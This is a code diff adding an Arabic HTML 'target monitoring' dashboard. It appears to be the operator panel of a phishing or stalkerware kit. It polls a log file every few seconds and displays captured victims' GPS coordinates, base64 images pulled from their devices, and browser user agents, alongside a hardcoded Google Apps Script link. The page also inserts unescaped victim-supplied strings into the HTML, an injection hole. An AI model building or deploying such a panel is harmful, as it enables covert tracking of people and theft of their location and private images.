@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم وعرض الوسائط</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        body { font-family: 'Share Tech Mono', monospace; background-color: #030a03; color: #00ff66; }
+        .glow-box { box-shadow: 0 0 15px rgba(0, 255, 102, 0.15); border: 1px solid rgba(0, 255, 102, 0.3); }
+    </style>
+</head>
+<body class="p-4 md:p-6 min-h-screen">
+    <div class="max-w-7xl mx-auto">
+        <header class="glow-box bg-black/90 rounded-xl p-4 mb-6 flex justify-between items-center">
+            <h1 class="text-lg md:text-xl font-bold tracking-widest">[+] لوحة مراقبة واستقبال الوسائط والأهداف</h1>
+            <div class="text-xs text-green-400">الحالة: <span class="text-green-300 font-bold animate-pulse">متصل ومستمع</span></div>
+        </header>
+
+        <div class="glow-box bg-black/90 rounded-xl p-5">
+            <h2 class="text-sm font-semibold mb-4 border-b border-green-500/30 pb-2">سجلات الأهداف والملفات المسحوبة (Captured Media Logs)</h2>
+            
+            <div class="overflow-x-auto">
+                <table class="w-full text-right text-xs">
+                    <thead>
+                        <tr class="border-b border-green-500/30 text-green-300">
+                            <th class="p-2">الوقت</th>
+                            <th class="p-2">الإحداثيات (Lat / Lng)</th>
+                            <th class="p-2">الصورة أو الملف المسحوب</th>
+                            <th class="p-2">نوع النظام</th>
+                            <th class="p-2">الخرائط</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logs-table">
+                        <tr class="border-b border-green-500/10 text-green-500/60">
+                            <td class="p-2 text-center" colspan="5">في انتظار استقبال البيانات والصور...</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function fetchLogs() {
+            // استبدل هذا الرابط برابط Google Apps Script المدعوم بصيغة قراءة البيانات أو استعرض السجلات من ملف JSON
+            fetch('access_logs.json')
+                .then(response => response.json())
+                .then(data => {
+                    const tbody = document.getElementById('logs-table');
+                    tbody.innerHTML = '';
+                    
+                    data.reverse().forEach(item => {
+                        const mapUrl = `https://script.google.com/macros/s/AKfycbzgyJak2WBkva-gwTFL0B4GxZmsi2D9Ni9ylM8b5mOf_Y7MAzNRLvVv7kNSjRr-4fo5Tw/exec`;
+                        const mediaPreview = item.mediaBase64 ? `<img src="${item.mediaBase64}" class="w-16 h-16 object-cover rounded border border-green-500/50">` : 'لا يوجد ملف';
+                        
+                        const row = `
+                            <tr class="border-b border-green-500/10 hover:bg-green-950/40 items-center">
+                                <td class="p-2">${item.timestamp}</td>
+                                <td class="p-2 text-cyan-300">${item.latitude}, <br>${item.longitude}</td>
+                                <td class="p-2">${mediaPreview}</td>
+                                <td class="p-2 truncate max-w-xs text-green-400/80" title="${item.userAgent}">${item.userAgent}</td>
+                                <td class="p-2">
+                                    <a href="${mapUrl}" target="_blank" class="bg-green-900/60 hover:bg-green-800 text-green-200 px-3 py-1 rounded text-[11px] border border-green-500/50">فتح الخريطة</a>
+                                </td>
+                            </tr>
+                        `;
+                        tbody.innerHTML += row;
+                    });
+                })
+                .catch(err => {});
+        }
+
+        setInterval(fetchLogs, 3000);
+        fetchLogs();
+    </script>
+</body>
+</html>
